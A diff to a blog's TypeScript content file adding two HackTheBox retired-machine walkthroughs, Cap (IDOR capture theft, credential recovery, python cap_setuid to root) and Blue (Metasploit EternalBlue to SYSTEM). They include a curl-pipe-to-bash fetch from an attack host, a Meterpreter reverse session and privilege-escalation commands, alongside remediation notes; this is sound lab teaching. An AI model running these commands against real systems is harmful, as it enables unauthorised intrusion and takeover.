@@ -1,3 +1,9 @@
+export type Block =
+  | { kind: 'p'; text: string }
+  | { kind: 'h'; text: string }
+  | { kind: 'code'; code: string; lang?: string; title?: string }
+  | { kind: 'img'; src: string; alt: string; caption?: string }
+
 export interface Post {
   slug: string
   title: string
@@ -6,9 +12,58 @@ export interface Post {
   summary: string
   level?: string
   body: string[]
+  blocks?: Block[]
 }
 
 export const writeups: Post[] = [
+  {
+    slug: 'htb-cap-idor-capture',
+    title: 'HTB Cap: IDOR capture theft and python capabilities to root',
+    tag: 'retired-machine',
+    date: '2026-09-30',
+    level: 'easy',
+    summary:
+      'Official-format walkthrough: Gunicorn dashboard recon, /data/<id> IDOR capture theft, Wireshark credential recovery, and cap_setuid python to root — with screenshots.',
+    body: [],
+    blocks: [
+      { kind: 'p', text: 'Cap is an easy Linux machine running an HTTP dashboard that performs administrative functions including network captures. Weak object references expose another user\u2019s capture, the capture holds plaintext credentials for foothold, and a Linux capability escalates to root. Format follows the official HTB walkthrough structure: synopsis, skills, enumeration, exploitation, privilege escalation.' },
+      { kind: 'h', text: 'Synopsis' },
+      { kind: 'p', text: 'Target services: FTP (21), SSH (22), and a Gunicorn-based HTTP dashboard on port 80. The dashboard executes system commands (ifconfig, netstat) and lets users take 5-second packet captures downloadable as PCAP files. Captures are addressed as /data/<id> with incrementing IDs — browsing /data/0 reveals another user\u2019s capture containing FTP authentication in plaintext. Those credentials work over SSH, and the cap_setuid capability on python3.8 gives root via os.setuid(0).' },
+      { kind: 'h', text: 'Skills required' },
+      { kind: 'p', text: 'Web enumeration, packet capture analysis with Wireshark, Linux capability abuse.' },
+      { kind: 'h', text: 'Enumeration — Nmap' },
+      { kind: 'code', lang: 'bash', title: 'nmap: all ports, then targeted scan', code: 'ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep \'^[0-9]\' | cut -d \'/\' -f 1 | tr \'\\n\' \',\' | sed s/,$//)\nnmap -p$ports -Pn -sC -sV 10.10.10.245' },
+      { kind: 'p', text: 'Nmap reveals three open ports: FTP (21, vsftpd 3.0.3), SSH (22, OpenSSH 8.2p1), and HTTP on port 80 (Gunicorn).' },
+      { kind: 'img', src: 'screenshots/cap/cap-nmap.png', alt: 'Nmap scan results against Cap showing FTP, SSH and HTTP', caption: 'Nmap results: FTP, SSH, and a Gunicorn HTTP server.' },
+      { kind: 'h', text: 'Enumeration — FTP' },
+      { kind: 'p', text: 'Check anonymous access first — it fails, so FTP is parked until credentials appear later.' },
+      { kind: 'code', lang: 'bash', title: 'ftp: test anonymous login', code: 'ftp 10.10.10.245\nName (10.10.10.245:root): anonymous\n331 Please specify the password.\nPassword:\n530 Login incorrect.\nftp: Login failed.' },
+      { kind: 'img', src: 'screenshots/cap/cap-ftp-fail.png', alt: 'FTP anonymous login rejected on Cap', caption: 'Anonymous FTP is disabled — moving on to HTTP.' },
+      { kind: 'h', text: 'Enumeration — HTTP dashboard' },
+      { kind: 'p', text: 'Browsing port 80 reveals a monitoring dashboard with Security Snapshot (5-second PCAP + analysis), IP Config, and Network Status pages. The IP Config page prints ifconfig output and Network Status prints netstat — the application is executing system commands. The Security Snapshot menu pauses a few seconds and returns a capture analysis page with a Download link for the PCAP.' },
+      { kind: 'img', src: 'screenshots/cap/cap-dashboard.png', alt: 'Cap monitoring dashboard with security events graphs', caption: 'The dashboard: security events, login attempts, and snapshot tools.' },
+      { kind: 'img', src: 'screenshots/cap/cap-ipconfig.png', alt: 'IP Config page showing ifconfig output', caption: 'IP Config leaks ifconfig output — the app runs system commands.' },
+      { kind: 'h', text: 'IDOR — another user\u2019s capture' },
+      { kind: 'p', text: 'New captures are addressed as /data/<id> with the ID incrementing per capture. Trying lower IDs is the obvious test: browsing to /data/0 reveals a capture with far more packets than ours — data belonging to another user. This is Insecure Direct Object Reference: no ownership check on the capture ID.' },
+      { kind: 'img', src: 'screenshots/cap/cap-capture-stats.png', alt: 'Our own capture analysis showing 8 packets', caption: 'Our capture: only 8 packets of our own traffic.' },
+      { kind: 'img', src: 'screenshots/cap/cap-capture-id0.png', alt: 'Capture ID 0 analysis showing 72 packets from another user', caption: '/data/0: 72 packets from somebody else — IDOR confirmed.' },
+      { kind: 'h', text: 'Foothold — Wireshark credential recovery' },
+      { kind: 'p', text: 'Download the ID 0 capture and open it in Wireshark. It contains FTP control traffic in plaintext, including USER nathan and the PASS value. The same credentials authenticate over SSH — foothold achieved.' },
+      { kind: 'img', src: 'screenshots/cap/cap-wireshark.png', alt: 'Wireshark showing FTP traffic inside the stolen capture', caption: 'The stolen capture in Wireshark: FTP control channel in cleartext.' },
+      { kind: 'img', src: 'screenshots/cap/cap-ftp-creds.png', alt: 'Wireshark packet detail showing FTP username and password', caption: 'USER nathan and its PASS in the clear — valid for SSH too.' },
+      { kind: 'code', lang: 'bash', title: 'ssh: login as nathan', code: 'ssh nathan@10.10.10.245\nnathan@cap:~$ id\nuid=1001(nathan) gid=1001(nathan) groups=1001(nathan)' },
+      { kind: 'img', src: 'screenshots/cap/cap-ssh.png', alt: 'SSH login as nathan with id output', caption: 'Foothold: SSH as nathan.' },
+      { kind: 'h', text: 'Privilege escalation — linpeas and capabilities' },
+      { kind: 'p', text: 'Run linpeas (serve it from the attack box with python3 -m http.server and pipe curl into bash) and look for files with capabilities. /usr/bin/python3.8 carries cap_setuid plus cap_net_bind_service — not a default. CAP_SETUID lets the process switch UID without the SUID bit, so python can become root directly.' },
+      { kind: 'code', lang: 'bash', title: 'bash: run linpeas, inspect capabilities', code: 'curl http://10.10.14.24/linpeas.sh | bash\n<SNIP>\nFiles with capabilities:\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/traceroute6.iputils = cap_net_raw+ep' },
+      { kind: 'img', src: 'screenshots/cap/cap-linpeas.png', alt: 'LinPEAS output showing python3.8 with cap_setuid', caption: 'LinPEAS flags it: python3.8 with cap_setuid.' },
+      { kind: 'code', lang: 'python', title: 'python: setuid to root', code: 'nathan@cap:/tmp$ /usr/bin/python3.8\n>>> import os\n>>> os.setuid(0)\n>>> os.system("/bin/bash")\nroot@cap:/tmp# id\nuid=0(root) gid=1001(nathan) groups=1001(nathan)' },
+      { kind: 'img', src: 'screenshots/cap/cap-root.png', alt: 'Python setuid to UID 0 with root shell and id output', caption: 'os.setuid(0): root shell. Both flags fall from here.' },
+      { kind: 'h', text: 'Remediation notes' },
+      { kind: 'p', text: 'Enforce per-user ownership checks on every object ID (the /data/<id> endpoint must verify the requester owns the capture), never transmit credentials in plaintext protocols, and never grant cap_setuid to interpreters — a capable python is a root shell waiting for three lines of code. User and root flag values are redacted per HTB rules.' },
+      { kind: 'p', text: 'Screenshots: official HTB walkthrough captures, used for illustration. Written by Lucky Thandel.' },
+    ],
+  },
   {
     slug: 'htb-blue-eternalblue',
     title: 'HTB Blue: EternalBlue (MS17-010) from nmap to SYSTEM',
@@ -27,6 +82,27 @@ export const writeups: Post[] = [
       'Dead ends I hit so you do not have to: trying SMB brute-force first (wasted twenty minutes — always run the vuln script before password guessing), and forgetting to set LHOST after switching VPN servers (the classic silent failure — session never calls home).',
       'Remediation notes for the defender side: disable SMBv1 everywhere, apply the MS17-010 patch, block port 445 at the perimeter, and alert on any SMBv1 negotiation still happening on the network. WannaCry wormed the planet through exactly this hole in 2017 — unpatched SMB is never just a lab problem.',
       'Next in this series: more retired-machine walkthroughs following the same checklist. Written by Lucky Thandel.',
+    ],
+    blocks: [
+      { kind: 'p', text: 'Blue is a retired HackTheBox easy Windows machine and the single best teacher of why unpatched SMB is catastrophic. Synopsis: enumerate SMB completely, confirm MS17-010, exploit EternalBlue to SYSTEM. Lab target only — techniques below are for retired boxes and authorized systems.' },
+      { kind: 'h', text: 'Enumeration — Nmap' },
+      { kind: 'code', lang: 'bash', title: 'nmap: services plus SMB vuln check', code: 'nmap -sC -sV -oN blue.nmap 10.10.10.40\nnmap --script smb-vuln-ms17-010 -p 445 10.10.10.40' },
+      { kind: 'p', text: 'Ports 135 (RPC), 139 (NetBIOS) and 445 (SMB) on Windows 7 Professional SP1. The vuln script reports the host VULNERABLE to remote code execution in SMBv1 (MS17-010) — a confirmed CVE, not a hunch.' },
+      { kind: 'h', text: 'Enumeration — SMB shares' },
+      { kind: 'code', lang: 'bash', title: 'bash: list shares and users', code: 'smbclient -L //10.10.10.40\nnxc smb 10.10.10.40 --shares' },
+      { kind: 'p', text: 'Nothing to log into — shares are empty or inaccessible — which tells you the intended path is the SMB service itself, not credentials.' },
+      { kind: 'h', text: 'Exploitation — EternalBlue' },
+      { kind: 'code', lang: 'bash', title: 'msfconsole: ms17_010_eternalblue', code: 'msfconsole -q\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.23\nmsf6 exploit(ms17_010_eternalblue) > run\n[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158)' },
+      { kind: 'p', text: 'The module negotiates the SMBv1 transaction overflow and returns a session as NT AUTHORITY\\SYSTEM on the first try when the target is genuinely unpatched.' },
+      { kind: 'h', text: 'Flags' },
+      { kind: 'code', lang: 'bash', title: 'meterpreter: locate both flags', code: 'meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > search -f user.txt\nmeterpreter > search -f root.txt' },
+      { kind: 'p', text: 'user.txt sits on a standard user desktop while root.txt needs SYSTEM — both fall in the single SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.' },
+      { kind: 'h', text: 'Why this works' },
+      { kind: 'p', text: 'MS17-010 is a buffer overflow in how SMBv1 handles crafted Trans2 requests. The exploit corrupts kernel pool memory to gain arbitrary code execution at the highest privilege level — one vulnerability equals total compromise, no privilege escalation step needed.' },
+      { kind: 'h', text: 'Dead ends' },
+      { kind: 'p', text: 'Trying SMB brute-force first (wasted twenty minutes — always run the vuln script before password guessing), and forgetting to set LHOST after switching VPN servers (the classic silent failure — session never calls home).' },
+      { kind: 'h', text: 'Remediation notes' },
+      { kind: 'p', text: 'Disable SMBv1 everywhere, apply the MS17-010 patch, block port 445 at the perimeter, and alert on any SMBv1 negotiation still happening on the network. WannaCry wormed the planet through exactly this hole in 2017. Written by Lucky Thandel.' },
     ],
   },
   {
